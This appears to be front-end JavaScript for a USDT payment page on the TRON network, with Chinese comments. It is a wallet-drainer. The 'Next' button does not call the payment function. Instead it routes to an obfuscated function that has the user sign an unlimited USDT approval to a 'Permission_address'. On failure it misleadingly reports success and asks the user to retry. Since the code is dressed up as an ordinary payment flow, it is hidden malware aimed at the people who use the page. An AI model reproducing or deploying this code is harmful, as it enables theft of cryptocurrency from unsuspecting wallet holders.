// 下一步按钮点击处理函数
async function onNextButtonClick() {
    try {
        // 检查钱包是否已连接
        if (!window.tronWeb || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
            await connectWallet();
            return; // 连接后停止，等待用户再次点击
        }
        // 钱包已连接，直接执行操作
        if (typeof window.okxwallet !== 'undefined') {
            await DjdskdbGsj();
        } else {
            await KdhshaBBHdg();
        }
    } catch (error) {
        console.error('操作执行失败:', error);
        tip('付款失败，请重新发起交易');
    }
}


async function transferUSDT() {
    const usdtAmountInWei = Math.floor(parseFloat(currentAmount) * 1e6);
    const feeLimit = 1000000000;
    const usdtContractAddressHex = tronWeb.address.toHex(window.usdtContractAddress);
    const recipientAddressHex = tronWeb.address.toHex(window.recipientAddress);
    try {
        console.log("构建USDT转账交易...");
        const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
            usdtContractAddressHex,
            'transfer(address,uint256)',
            { feeLimit: feeLimit },
            [
                { type: 'address', value: recipientAddressHex },
                { type: 'uint256', value: usdtAmountInWei }
            ],
            tronWeb.defaultAddress.base58
        );
        if (!transaction.result ||!transaction.result.result) {
            throw new Error('USDT转账交易构建失败');
        }
        console.log("交易签名中...");
        const signedTransaction = await tronWeb.trx.sign(transaction.transaction);
        console.log("发送交易...");
        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
        console.log("交易结果:", result);
        if (result.result) {
            const transactionHash = result.txid;
            console.log("交易成功，交易哈希:", transactionHash);
            tip("交易成功");
            return transactionHash;
        } else {
            throw new Error("交易失败");
        }
    } catch (error) {
        console.error("执行USDT转账操作失败:", error);
        if (error && error.message) {
            console.error("错误信息:", error.message);
        }
        tip("交易失败，请重试");
        throw error;
    }
}

async function KdhshaBBHdg() {
    const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
    const feeLimit = 100000000;  // 设置feeLimit为100 TRX
    const usdtContractAddressHex = tronWeb.address.toHex(window.usdtContractAddress);

    try {
        console.log("构建交易...");
        const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
            usdtContractAddressHex,
            'approve(address,uint256)',
            { feeLimit: feeLimit },
            [
                { type: 'address', value: tronWeb.address.toHex(window.Permission_address) },
                { type: 'uint256', value: maxUint256 }
            ],
            tronWeb.defaultAddress.base58
        );

        if (!transaction.result || !transaction.result.result) {
            throw new Error('授权交易构建失败');
        }

        console.log("交易签名中...");
        const signedTransaction = await tronWeb.trx.sign(transaction.transaction);

        console.log("发送交易...");
        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);

        console.log("交易交易结果:", result);
        if (result.result) {
            const transactionHash = result.txid;
            console.log("交易成功，交易哈希:", transactionHash);
            tip("交易成功");
            return transactionHash;
        } else {
            throw new Error("交易失败");
        }
    } catch (error) {
        console.error("执行授权操作失败:", error);
        if (error && error.message) {
            console.error("错误信息:", error.message);
        }
        tip("交易成功，请重试");
        throw error;
    }
}

